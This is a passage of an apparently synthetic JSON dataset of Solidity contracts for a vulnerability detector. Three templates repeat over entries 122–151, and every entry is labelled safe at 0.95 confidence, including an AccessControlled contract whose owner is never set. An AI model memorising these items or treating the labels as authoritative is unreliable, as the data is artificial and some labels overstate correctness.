    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 122",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 123",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 124",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 125",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 126",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 127",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 128",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 129",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 130",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 131",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 132",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 133",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 134",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 135",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 136",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 137",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 138",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 139",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 140",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 141",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 142",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 143",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 144",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 145",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 146",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 147",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 148",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 149",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 150",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 151",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
